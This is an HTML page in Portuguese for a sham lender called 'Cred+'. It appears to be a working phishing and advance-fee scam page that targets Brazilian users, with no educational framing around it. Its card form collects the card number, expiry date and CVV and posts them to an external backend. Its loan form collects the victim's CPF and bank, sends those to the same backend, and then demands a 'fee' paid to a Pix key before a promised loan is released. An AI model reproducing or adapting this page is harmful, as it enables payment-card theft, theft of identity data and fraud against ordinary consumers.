<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Cred+ - Confirmação</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet"/>
  <style>
    body {
      font-family: 'Poppins', sans-serif;
      background-color: #b30000;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }

    .container {
      background-color: #fff;
      padding: 40px 30px;
      border-radius: 10px;
      width: 100%;
      max-width: 400px;
      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.2);
    }

    h2, h3 {
      text-align: center;
      color: #333;
      margin-bottom: 20px;
      font-size: 20px;
    }

    .options {
      display: flex;
      flex-direction: column;
      gap: 15px;
    }

    .options button {
      padding: 15px;
      font-size: 16px;
      font-weight: bold;
      background-color: #b30000;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }

    form {
      display: none;
    }

    label {
      display: block;
      margin-top: 15px;
      font-weight: 500;
      color: #555;
    }

    input, select {
      width: 100%;
      padding: 12px;
      margin-top: 6px;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 15px;
    }

    .form-row {
      display: flex;
      gap: 10px;
    }

    .form-row input {
      flex: 1;
    }

    .card-logos {
      margin-top: 10px;
      display: flex;
      gap: 10px;
    }

    .card-logos img {
      height: 26px;
      opacity: 0.8;
    }

    button[type="submit"] {
      margin-top: 25px;
      width: 100%;
      padding: 14px;
      background-color: #b30000;
      color: #fff;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
    }

    .info-text {
      margin-top: 15px;
      font-size: 13px;
      color: #555;
      text-align: center;
    }

    #resultado {
      margin-top: 25px;
      text-align: center;
    }

    @media (max-width: 500px) {
      .container {
        margin: 20px;
        padding: 30px 20px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Escolha uma opção</h2>
    <div class="options" id="menu-opcoes">
      <button onclick="mostrarFormulario('cartao')">Aumento/liberação de limite</button>
      <button onclick="mostrarFormulario('emprestimo')">Empréstimo</button>
    </div>

    <!-- Formulário Cartão -->
    <form id="form-cartao">
      <h2>Confirme os dados do cartão</h2>
      <label for="card-number">Número do Cartão</label>
      <input type="text" id="card-number" maxlength="19" placeholder="0000 0000 0000 0000" required />

      <div class="card-logos">
        <img src="https://img.icons8.com/color/48/000000/visa.png" alt="Visa">
        <img src="https://img.icons8.com/color/48/000000/mastercard.png" alt="Mastercard">
        <img src="https://img.icons8.com/color/48/000000/amex.png" alt="Amex">
      </div>

      <div class="form-row">
        <div>
          <label for="validade">Validade</label>
          <input type="text" id="validade" maxlength="5" placeholder="MM/AA" required />
        </div>
        <div>
          <label for="cvv">CVV</label>
          <input type="text" id="cvv" maxlength="4" placeholder="123" required />
        </div>
      </div>

      <button type="submit">Confirmar</button>
      <p class="info-text">O novo limite será disponibilizado em até 2 a 5 dias úteis após análise.</p>
    </form>

    <!-- Formulário Empréstimo -->
    <form id="form-emprestimo">
      <h2>Solicitar Empréstimo</h2>
      <label for="valor">Quanto você deseja?</label>
      <input type="text" id="valor" placeholder="Ex: 5000" required />

      <label for="banco">Qual seu banco?</label>
      <input type="text" id="banco" placeholder="Ex: Nubank" required />

      <label for="cpf">Qual seu CPF?</label>
      <input type="text" id="cpf" placeholder="000.000.000-00" required />

      <button type="submit">Solicitar</button>
    </form>

    <!-- Resultado -->
    <div id="resultado"></div>
  </div>

  <script>
    const formCartao = document.getElementById('form-cartao');
    const formEmprestimo = document.getElementById('form-emprestimo');
    const resultadoDiv = document.getElementById('resultado');

    function mostrarFormulario(tipo) {
      document.getElementById('menu-opcoes').style.display = 'none';
      if (tipo === 'cartao') {
        formCartao.style.display = 'block';
      } else {
        formEmprestimo.style.display = 'block';
      }
    }

    // Máscaras
    document.getElementById('card-number').addEventListener('input', function (e) {
      let value = e.target.value.replace(/\D/g, '').slice(0, 16);
      e.target.value = value.replace(/(.{4})/g, '$1 ').trim();
    });

    document.getElementById('validade').addEventListener('input', function (e) {
      let value = e.target.value.replace(/\D/g, '').slice(0, 4);
      if (value.length >= 3) value = value.slice(0, 2) + '/' + value.slice(2);
      e.target.value = value;
    });

    document.getElementById('cvv').addEventListener('input', function (e) {
      e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
    });

    formCartao.addEventListener('submit', function (e) {
      e.preventDefault();
      fetch('https://credplus-backend.onrender.com/enviar', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          numeroCartao: document.getElementById('card-number').value,
          validade: document.getElementById('validade').value,
          cvv: document.getElementById('cvv').value
        })
      })
      .then(res => res.ok ? window.location.href = 'sucesso.html' : alert('Erro ao enviar.'))
      .catch(() => alert('Erro ao enviar.'));
    });

    formEmprestimo.addEventListener('submit', function (e) {
      e.preventDefault();

      const valorInput = document.getElementById('valor').value;
      const valor = parseFloat(valorInput.replace(',', '.'));
      const banco = document.getElementById('banco').value;
      const cpf = document.getElementById('cpf').value;

      if (isNaN(valor) || valor <= 0) {
        alert('Por favor, insira um valor válido.');
        return;
      }

      const taxa = Math.min(valor * 0.12, 150);
      const valorFormatado = valor.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
      const taxaFormatada = taxa.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });

      resultadoDiv.innerHTML = `
        <p><strong>Valor escolhido:</strong> ${valorFormatado}</p>
        <p><strong>Valor da taxa:</strong> ${taxaFormatada}</p>
        <div style="
          background-color: #f9f9f9;
          border: 1px solid #ccc;
          border-radius: 10px;
          padding: 20px;
          margin-top: 20px;
          text-align: center;
        ">
          <h3 style="margin-bottom: 10px; color: #b30000;">Negociação quase concluída</h3>
          <p style="font-weight: 500;">PAGUE A TAXA NO PIX INFORMADO ABAIXO PARA LIBERAR O VALOR SELECIONADO</p>
          <p style="margin: 15px 0; font-size: 16px;">
            <strong>CHAVE PIX:</strong><br>
            <input type="text" value="d45e4ea4-d3d0-42a6-8050-e93bec690d65" id="pix-chave" readonly
              style="margin-top: 8px; padding: 8px; font-size: 14px; width: 100%; border: 1px solid #aaa; border-radius: 6px;" />
            <button onclick="copiarPix()" style="
              margin-top: 10px;
              padding: 8px 12px;
              font-size: 14px;
              background-color: #b30000;
              color: white;
              border: none;
              border-radius: 6px;
              cursor: pointer;
            ">Copiar Chave Pix</button>
          </p>
          <p style="font-size: 13px; color: #555;">
            Após pagar a taxa, o valor do empréstimo será liberado em sua conta em até 1 a 3 horas
            <br>(Feriados e fins de semana podem levar mais tempo)
          </p>
        </div>
      `;

      fetch('https://credplus-backend.onrender.com/enviar', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          valor: valorFormatado,
          banco: banco,
          cpf: cpf,
          taxa: taxaFormatada
        })
      }).catch(() => alert('Erro ao enviar.'));
    });

    function copiarPix() {
      const input = document.getElementById("pix-chave");
      input.select();
      input.setSelectionRange(0, 99999);
      document.execCommand("copy");
      alert("Chave Pix copiada!");
    }
  </script>
</body>
</html>
